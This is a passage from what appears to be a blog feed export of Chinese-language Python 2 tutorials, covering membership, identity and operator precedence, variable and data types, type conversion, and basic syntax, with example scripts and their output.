class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 2 - b is not available in the given list"</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 2 - b is available in the given list"</span>a <span class="token operator">=</span> <span class="token number">2</span><span class="token keyword">if</span> <span class="token punctuation">(</span> a <span class="token keyword">in</span> list <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 3 - a is available in the given list"</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 3 - a is not available in the given list"</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Line <span class="token number">1</span> <span class="token operator">-</span> a <span class="token keyword">is</span> <span class="token operator">not</span> available <span class="token keyword">in</span> the given listLine <span class="token number">2</span> <span class="token operator">-</span> b <span class="token keyword">is</span> <span class="token operator">not</span> available <span class="token keyword">in</span> the given listLine <span class="token number">3</span> <span class="token operator">-</span> a <span class="token keyword">is</span> available <span class="token keyword">in</span> the given list</code></pre><h4 id="身份"><a href="#身份" class="headerlink" title="身份"></a>身份</h4><p>恒等运算符比较两个对象的内存位置。有两个身份运算符</p><table><thead><tr><th align="center">Operator</th><th align="center">Description</th><th align="center">Example</th></tr></thead><tbody><tr><td align="center">is</td><td align="center">如果操作符两边的变量指向同一个对象，则计算为true，否则为false。</td><td align="center">x is y, here is results in 1 if id(x) equals id(y).</td></tr><tr><td align="center">is not</td><td align="center">如果操作符两边的变量指向同一个对象，则计算为false，否则为true。</td><td align="center">x is not y, here is not results in 1 if id(x) is not equal to id(y).</td></tr></tbody></table><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>a <span class="token operator">=</span> <span class="token number">20</span>b <span class="token operator">=</span> <span class="token number">20</span><span class="token keyword">if</span> <span class="token punctuation">(</span> a <span class="token keyword">is</span> b <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 1 - a and b have same identity"</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 1 - a and b do not have same identity"</span><span class="token keyword">if</span> <span class="token punctuation">(</span> id<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">==</span> id<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 2 - a and b have same identity"</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 2 - a and b do not have same identity"</span>b <span class="token operator">=</span> <span class="token number">30</span><span class="token keyword">if</span> <span class="token punctuation">(</span> a <span class="token keyword">is</span> b <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 3 - a and b have same identity"</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 3 - a and b do not have same identity"</span><span class="token keyword">if</span> <span class="token punctuation">(</span> a <span class="token keyword">is</span> <span class="token operator">not</span> b <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 4 - a and b do not have same identity"</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token string">"Line 4 - a and b have same identity"</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Line <span class="token number">1</span> <span class="token operator">-</span> a <span class="token operator">and</span> b have same identityLine <span class="token number">2</span> <span class="token operator">-</span> a <span class="token operator">and</span> b have same identityLine <span class="token number">3</span> <span class="token operator">-</span> a <span class="token operator">and</span> b do <span class="token operator">not</span> have same identityLine <span class="token number">4</span> <span class="token operator">-</span> a <span class="token operator">and</span> b do <span class="token operator">not</span> have same identity</code></pre><h3 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h3><p>下表列出了从最高优先级到最低优先级的所有运算符</p><table><thead><tr><th>Operator</th><th>Description</th></tr></thead><tbody><tr><td>**</td><td>Exponentiation (raise to the power)</td></tr><tr><td>~ + -</td><td>Complement, unary plus and minus (method names for the last two are +@ and -@)</td></tr><tr><td>* / % //</td><td>Multiply, divide, modulo and floor division</td></tr><tr><td>+ -</td><td>Addition and subtraction</td></tr><tr><td>&gt;&gt; &lt;&lt;</td><td>Right and left bitwise shift</td></tr><tr><td>&amp;</td><td>Bitwise ‘AND’td&gt;</td></tr><tr><td>^ |</td><td>Bitwise exclusive <code>OR' and regular </code>OR’</td></tr><tr><td>&lt;= &lt; &gt; &gt;=</td><td>Comparison operators</td></tr><tr><td>&lt;&gt; == !=</td><td>Equality operators</td></tr><tr><td>= %= /= //= -= += *= **=</td><td>Assignment operators</td></tr><tr><td>is is not</td><td>Identity operators</td></tr><tr><td>in not in</td><td>Membership operators</td></tr><tr><td>not or and</td><td>Logical operators</td></tr></tbody></table><p>运算符优先级影响表达式的计算方式。例如，x = 7 + 3 * 2；在这里，x 被赋值为 13，而不是 20，因为运算符的优先级高于 +，所以它首先将 32 相乘，然后加到 7。这里，优先级最高的运算符出现在表的顶部，最低的出现在表的顶部底部。</p><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>a <span class="token operator">=</span> <span class="token number">20</span>b <span class="token operator">=</span> <span class="token number">10</span>c <span class="token operator">=</span> <span class="token number">15</span>d <span class="token operator">=</span> <span class="token number">5</span>e <span class="token operator">=</span> <span class="token number">0</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> c <span class="token operator">/</span> d       <span class="token comment" spellcheck="true">#( 30 * 15 ) / 5</span><span class="token keyword">print</span> <span class="token string">"Value of (a + b) * c / d is "</span><span class="token punctuation">,</span>  ee <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> c<span class="token punctuation">)</span> <span class="token operator">/</span> d     <span class="token comment" spellcheck="true"># (30 * 15 ) / 5</span><span class="token keyword">print</span> <span class="token string">"Value of ((a + b) * c) / d is "</span><span class="token punctuation">,</span>  ee <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>c <span class="token operator">/</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># (30) * (15/5)</span><span class="token keyword">print</span> <span class="token string">"Value of (a + b) * (c / d) is "</span><span class="token punctuation">,</span>  ee <span class="token operator">=</span> a <span class="token operator">+</span> <span class="token punctuation">(</span>b <span class="token operator">*</span> c<span class="token punctuation">)</span> <span class="token operator">/</span> d<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">#  20 + (150/5)</span><span class="token keyword">print</span> <span class="token string">"Value of a + (b * c) / d is "</span><span class="token punctuation">,</span>  e</code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Value of <span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> c <span class="token operator">/</span> d <span class="token keyword">is</span> <span class="token number">90</span>Value of <span class="token punctuation">(</span><span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> c<span class="token punctuation">)</span> <span class="token operator">/</span> d <span class="token keyword">is</span> <span class="token number">90</span>Value of <span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>c <span class="token operator">/</span> d<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token number">90</span>Value of a <span class="token operator">+</span> <span class="token punctuation">(</span>b <span class="token operator">*</span> c<span class="token punctuation">)</span> <span class="token operator">/</span> d <span class="token keyword">is</span> <span class="token number">50</span></code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Operator </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python programming 4</title>
      <link href="posts/c182.html"/>
      <url>posts/c182.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>基础永远值得花费90%的精力去学习加强。认识实践的重要性。</p></blockquote><h2 id="Ax-Python-Variable-Types-类型"><a href="#Ax-Python-Variable-Types-类型" class="headerlink" title="Ax Python Variable Types | 类型"></a>Ax Python Variable Types | 类型</h2><p>创建变量意味着你将在内存保留一些空间，而为了这个空间是你所需要的合适大小范围之内，所以提供了不同的类型，你可以在这些变量中存储小数、整数、字符。</p><h3 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h3><p>python不需要声明，只需要用（=）赋值即可，声明会自动发生。左边是变量名，右边是值。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>counter <span class="token operator">=</span> <span class="token number">100</span>          <span class="token comment" spellcheck="true"># An integer assignment</span>miles   <span class="token operator">=</span> <span class="token number">1000.0</span>       <span class="token comment" spellcheck="true"># A floating point</span>name    <span class="token operator">=</span> <span class="token string">"John"</span>       <span class="token comment" spellcheck="true"># A string</span><span class="token keyword">print</span> counter<span class="token keyword">print</span> miles<span class="token keyword">print</span> name</code></pre><p>执行</p><pre class=" language-python"><code class="language-python"><span class="token number">100</span><span class="token number">1000.0</span>John</code></pre><h3 id="多重赋值"><a href="#多重赋值" class="headerlink" title="多重赋值"></a>多重赋值</h3><p>一个值赋给多个变量</p><pre class=" language-python"><code class="language-python">a <span class="token operator">=</span> b <span class="token operator">=</span> c <span class="token operator">=</span> <span class="token number">1</span></code></pre><p>多个值赋给多个变量</p><pre class=" language-python"><code class="language-python">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"john"</span></code></pre><h3 id="标准数据类型"><a href="#标准数据类型" class="headerlink" title="标准数据类型"></a>标准数据类型</h3><p>有五种类型</p><ul><li>Numbers</li><li>String</li><li>List</li><li>Tuple</li><li>Dictionary</li></ul><h4 id="Numbers-数字"><a href="#Numbers-数字" class="headerlink" title="Numbers | 数字"></a>Numbers | 数字</h4><p>数字有这些类型</p><ul><li>int (有符号整数)</li><li>long (长整型可以用八进制和十六进制表示)</li><li>float (浮点型实数)</li><li>complex (复数)</li></ul><p>赋值给变量，分配空间</p><pre class=" language-python"><code class="language-python">var1 <span class="token operator">=</span> <span class="token number">1</span>var2 <span class="token operator">=</span> <span class="token number">10</span></code></pre><p>删除引用，删除的是变量！</p><pre class=" language-python"><code class="language-python"><span class="token keyword">del</span> var1<span class="token punctuation">[</span><span class="token punctuation">,</span>var2<span class="token punctuation">[</span><span class="token punctuation">,</span>var3<span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>varN<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><p>你可以删除单个或多个。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">del</span> var<span class="token keyword">del</span> var_a<span class="token punctuation">,</span> var_b</code></pre><p>不同的类型大小不同</p><table><thead><tr><th align="center">int</th><th align="center">long</th><th align="center">float</th><th align="center">complex</th></tr></thead><tbody><tr><td align="center">10</td><td align="center">51924361L</td><td align="center">0.0</td><td align="center">3.14j</td></tr><tr><td align="center">100</td><td align="center">-0x19323L</td><td align="center">15.20</td><td align="center">45.j</td></tr><tr><td align="center">-786</td><td align="center">0122L</td><td align="center">-21.9</td><td align="center">9.322e-36j</td></tr><tr><td align="center">080</td><td align="center">0xDEFABCECBDAECBFBAEl</td><td align="center">32.3+e18</td><td align="center">.876j</td></tr><tr><td align="center">-0490</td><td align="center">535633629843L</td><td align="center">-90.</td><td align="center">-.6545+0J</td></tr><tr><td align="center">-0x260</td><td align="center">-052318172735L</td><td align="center">-32.54e100</td><td align="center">3e+26J</td></tr><tr><td align="center">0x69</td><td align="center">-4721885298529L</td><td align="center">70.2-E12</td><td align="center">4.53e-7j</td></tr></tbody></table><p>建议使用大写的L表示，避免误读成1.</p><h4 id="String-字符串"><a href="#String-字符串" class="headerlink" title="String | 字符串"></a>String | 字符串</h4><p>用单引号或双引号表示一串连续的字符。可以使用切片字符对文字进行检索[] 和 [:]</p><p>+是连续操作符，*是重复操作符</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>str <span class="token operator">=</span> <span class="token string">'Hello World!'</span><span class="token keyword">print</span> str          <span class="token comment" spellcheck="true"># Prints complete string</span><span class="token keyword">print</span> str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>       <span class="token comment" spellcheck="true"># Prints first character of the string</span><span class="token keyword">print</span> str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>     <span class="token comment" spellcheck="true"># Prints characters starting from 3rd to 5th</span><span class="token keyword">print</span> str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>      <span class="token comment" spellcheck="true"># Prints string starting from 3rd character</span><span class="token keyword">print</span> str <span class="token operator">*</span> <span class="token number">2</span>      <span class="token comment" spellcheck="true"># Prints string two times</span><span class="token keyword">print</span> str <span class="token operator">+</span> <span class="token string">"TEST"</span> <span class="token comment" spellcheck="true"># Prints concatenated string</span></code></pre><p>执行 −</p><pre class=" language-python"><code class="language-python">Hello World!Hllollo World!Hello World!Hello World!Hello World!TEST</code></pre><h4 id="Lists-列表"><a href="#Lists-列表" class="headerlink" title="Lists | 列表"></a>Lists | 列表</h4><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>list <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token string">'abcd'</span><span class="token punctuation">,</span> <span class="token number">786</span> <span class="token punctuation">,</span> <span class="token number">2.23</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">,</span> <span class="token number">70.2</span> <span class="token punctuation">]</span>tinylist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">]</span><span class="token keyword">print</span> list          <span class="token comment" spellcheck="true"># Prints complete list</span><span class="token keyword">print</span> list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>       <span class="token comment" spellcheck="true"># Prints first element of the list</span><span class="token keyword">print</span> list<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span>     <span class="token comment" spellcheck="true"># Prints elements starting from 2nd till 3rd </span><span class="token keyword">print</span> list<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>      <span class="token comment" spellcheck="true"># Prints elements starting from 3rd element</span><span class="token keyword">print</span> tinylist <span class="token operator">*</span> <span class="token number">2</span>  <span class="token comment" spellcheck="true"># Prints list two times</span><span class="token keyword">print</span> list <span class="token operator">+</span> tinylist <span class="token comment" spellcheck="true"># Prints concatenated lists</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token string">'abcd'</span><span class="token punctuation">,</span> <span class="token number">786</span><span class="token punctuation">,</span> <span class="token number">2.23</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">,</span> <span class="token number">70.2</span><span class="token punctuation">]</span>abcd<span class="token punctuation">[</span><span class="token number">786</span><span class="token punctuation">,</span> <span class="token number">2.23</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2.23</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">,</span> <span class="token number">70.2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'abcd'</span><span class="token punctuation">,</span> <span class="token number">786</span><span class="token punctuation">,</span> <span class="token number">2.23</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">,</span> <span class="token number">70.2</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">]</span></code></pre><h4 id="Tuple-元组"><a href="#Tuple-元组" class="headerlink" title="Tuple | 元组"></a>Tuple | 元组</h4><p>元组是不能更新的。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>tuple <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token string">'abcd'</span><span class="token punctuation">,</span> <span class="token number">786</span> <span class="token punctuation">,</span> <span class="token number">2.23</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">,</span> <span class="token number">70.2</span>  <span class="token punctuation">)</span>tinytuple <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">)</span><span class="token keyword">print</span> tuple               <span class="token comment" spellcheck="true"># Prints the complete tuple</span><span class="token keyword">print</span> tuple<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token comment" spellcheck="true"># Prints first element of the tuple</span><span class="token keyword">print</span> tuple<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span>          <span class="token comment" spellcheck="true"># Prints elements of the tuple starting from 2nd till 3rd </span><span class="token keyword">print</span> tuple<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>           <span class="token comment" spellcheck="true"># Prints elements of the tuple starting from 3rd element</span><span class="token keyword">print</span> tinytuple <span class="token operator">*</span> <span class="token number">2</span>       <span class="token comment" spellcheck="true"># Prints the contents of the tuple twice</span><span class="token keyword">print</span> tuple <span class="token operator">+</span> tinytuple   <span class="token comment" spellcheck="true"># Prints concatenated tuples</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">(</span><span class="token string">'abcd'</span><span class="token punctuation">,</span> <span class="token number">786</span><span class="token punctuation">,</span> <span class="token number">2.23</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">,</span> <span class="token number">70.2</span><span class="token punctuation">)</span>abcd<span class="token punctuation">(</span><span class="token number">786</span><span class="token punctuation">,</span> <span class="token number">2.23</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2.23</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">,</span> <span class="token number">70.2</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'abcd'</span><span class="token punctuation">,</span> <span class="token number">786</span><span class="token punctuation">,</span> <span class="token number">2.23</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">,</span> <span class="token number">70.2</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">)</span></code></pre><h4 id="Dictionary-字典"><a href="#Dictionary-字典" class="headerlink" title="Dictionary | 字典"></a>Dictionary | 字典</h4><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>dict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>dict<span class="token punctuation">[</span><span class="token string">'one'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"This is one"</span>dict<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token string">"This is two"</span>tinydict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'john'</span><span class="token punctuation">,</span><span class="token string">'code'</span><span class="token punctuation">:</span><span class="token number">6734</span><span class="token punctuation">,</span> <span class="token string">'dept'</span><span class="token punctuation">:</span> <span class="token string">'sales'</span><span class="token punctuation">}</span><span class="token keyword">print</span> dict<span class="token punctuation">[</span><span class="token string">'one'</span><span class="token punctuation">]</span>       <span class="token comment" spellcheck="true"># Prints value for 'one' key</span><span class="token keyword">print</span> dict<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>           <span class="token comment" spellcheck="true"># Prints value for 2 key</span><span class="token keyword">print</span> tinydict          <span class="token comment" spellcheck="true"># Prints complete dictionary</span><span class="token keyword">print</span> tinydict<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># Prints all the keys</span><span class="token keyword">print</span> tinydict<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Prints all the values</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">This <span class="token keyword">is</span> oneThis <span class="token keyword">is</span> two<span class="token punctuation">{</span><span class="token string">'dept'</span><span class="token punctuation">:</span> <span class="token string">'sales'</span><span class="token punctuation">,</span> <span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token number">6734</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'john'</span><span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token string">'dept'</span><span class="token punctuation">,</span> <span class="token string">'code'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'sales'</span><span class="token punctuation">,</span> <span class="token number">6734</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">]</span></code></pre><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><table><thead><tr><th align="center">Sr.No.</th><th align="center">Function</th><th>Description</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><strong>int(x [,base])</strong></td><td>转为整数，如果是字符串，指定基数</td></tr><tr><td align="center">2</td><td align="center"><strong>long(x [,base] )</strong></td><td>转为长整数，如果是字符串，指定基数</td></tr><tr><td align="center">3</td><td align="center"><strong>float(x)</strong></td><td>转为浮点数</td></tr><tr><td align="center">4</td><td align="center"><strong>complex(real [,imag])</strong></td><td>创建一个复数</td></tr><tr><td align="center">5</td><td align="center"><strong>str(x)</strong></td><td>转为字符串</td></tr><tr><td align="center">6</td><td align="center"><strong>repr(x)</strong></td><td>转为表达式字符串</td></tr><tr><td align="center">7</td><td align="center"><strong>eval(str)</strong></td><td>计算一个字符串并返回一个对象</td></tr><tr><td align="center">8</td><td align="center"><strong>tuple(s)</strong></td><td>转为元组</td></tr><tr><td align="center">9</td><td align="center"><strong>list(s)</strong></td><td>转为列表</td></tr><tr><td align="center">10</td><td align="center"><strong>set(s)</strong></td><td>转为集合</td></tr><tr><td align="center">11</td><td align="center"><strong>dict(d)</strong></td><td>创建一个字典，d是由键和值组成的元组</td></tr><tr><td align="center">12</td><td align="center"><strong>frozenset(s)</strong></td><td>转为一个冻结的集合</td></tr><tr><td align="center">13</td><td align="center"><strong>chr(x)</strong></td><td>将整数转为字符</td></tr><tr><td align="center">14</td><td align="center"><strong>unichr(x)</strong></td><td>将整数转为unicode</td></tr><tr><td align="center">15</td><td align="center"><strong>ord(x)</strong></td><td>单个字符转为整数值</td></tr><tr><td align="center">16</td><td align="center"><strong>hex(x)</strong></td><td>整数转为十六进制字符串</td></tr><tr><td align="center">17</td><td align="center"><strong>oct(x)</strong></td><td>整数转为八进制字符串</td></tr></tbody></table><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Type </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python programming 3</title>
      <link href="posts/3c3.html"/>
      <url>posts/3c3.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>基础永远值得花费90%的精力去学习加强。认识实践的重要性。</p></blockquote><h2 id="Ax-Python-Basic-Syntax-语法"><a href="#Ax-Python-Basic-Syntax-语法" class="headerlink" title="Ax Python Basic Syntax | 语法"></a>Ax Python Basic Syntax | 语法</h2><h3 id="第一个程序"><a href="#第一个程序" class="headerlink" title="第一个程序"></a>第一个程序</h3><h4 id="使用交互式"><a href="#使用交互式" class="headerlink" title="使用交互式"></a>使用交互式</h4><pre class=" language-python"><code class="language-python">$ pythonPython <span class="token number">2.4</span><span class="token punctuation">.</span><span class="token number">3</span> <span class="token punctuation">(</span><span class="token comment" spellcheck="true">#1, Nov 11 2010, 13:34:43)</span><span class="token punctuation">[</span>GCC <span class="token number">4.1</span><span class="token punctuation">.</span><span class="token number">2</span> <span class="token number">20080704</span> <span class="token punctuation">(</span>Red Hat <span class="token number">4.1</span><span class="token punctuation">.</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">]</span> on linux2Type <span class="token string">"help"</span><span class="token punctuation">,</span> <span class="token string">"copyright"</span><span class="token punctuation">,</span> <span class="token string">"credits"</span> <span class="token operator">or</span> <span class="token string">"license"</span> <span class="token keyword">for</span> more information<span class="token punctuation">.</span><span class="token operator">>></span><span class="token operator">></span></code></pre><p>输入python后，得到python的交互式窗口，输入print语句</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span> <span class="token string">"Hello, Python!"</span></code></pre><p>回车</p><pre class=" language-python"><code class="language-python">Hello<span class="token punctuation">,</span> Python!</code></pre><h4 id="使用脚本"><a href="#使用脚本" class="headerlink" title="使用脚本"></a>使用脚本</h4><p>将print语句保存到**.py**文件中，然后使用python加文件参数运行。</p><pre class=" language-python"><code class="language-python">$ python test<span class="token punctuation">.</span>py</code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Hello<span class="token punctuation">,</span> Python!</code></pre><p>用另一种方式执行，在脚本中声明解释器路径。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">print</span> <span class="token string">"Hello, Python!"</span></code></pre><p>执行，权限不够加个权。</p><pre class=" language-python"><code class="language-python">$<span class="token punctuation">.</span><span class="token operator">/</span>test<span class="token punctuation">.</span>py</code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Hello<span class="token punctuation">,</span> Python!</code></pre><h3 id="保留关键字"><a href="#保留关键字" class="headerlink" title="保留关键字"></a>保留关键字</h3><p>这些就不要去用了</p><table><thead><tr><th>and</th><th>exec</th><th>not</th></tr></thead><tbody><tr><td>assert</td><td>finally</td><td>or</td></tr><tr><td>break</td><td>for</td><td>pass</td></tr><tr><td>class</td><td>from</td><td>print</td></tr><tr><td>continue</td><td>global</td><td>raise</td></tr><tr><td>def</td><td>if</td><td>return</td></tr><tr><td>del</td><td>import</td><td>try</td></tr><tr><td>elif</td><td>in</td><td>while</td></tr><tr><td>else</td><td>is</td><td>with</td></tr><tr><td>except</td><td>lambda</td><td>yield</td></tr></tbody></table><h3 id="行与缩进"><a href="#行与缩进" class="headerlink" title="行与缩进"></a>行与缩进</h3><p>python没有用括号，所以缩进是强制的。</p><p>缩进并没有严格要求几个空格，但每个块缩进必须保持一致。</p><h3 id="多行语句"><a href="#多行语句" class="headerlink" title="多行语句"></a>多行语句</h3><p>语句以一个新行为结束，如果想继续使用新的一个物理行来延续一个逻辑行，使用 <code>\</code>来表示行的继续。</p><pre class=" language-python"><code class="language-python">total <span class="token operator">=</span> item_one <span class="token operator">+</span> \item_two <span class="token operator">+</span> \item_three</code></pre><p>但在括号中就不需要，[]{}()，例如</p><pre class=" language-python"><code class="language-python">days <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Monday'</span><span class="token punctuation">,</span> <span class="token string">'Tuesday'</span><span class="token punctuation">,</span> <span class="token string">'Wednesday'</span><span class="token punctuation">,</span><span class="token string">'Thursday'</span><span class="token punctuation">,</span> <span class="token string">'Friday'</span><span class="token punctuation">]</span></code></pre><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>python有单引号、双引号和三引号来表示字符串字面量，三引号用于多行。</p><pre class=" language-python"><code class="language-python">word <span class="token operator">=</span> <span class="token string">'word'</span>sentence <span class="token operator">=</span> <span class="token string">"This is a sentence."</span>paragraph <span class="token operator">=</span> <span class="token triple-quoted-string string">"""This is a paragraph. It ismade up of multiple lines and sentences."""</span></code></pre><h3 id="注释"><a 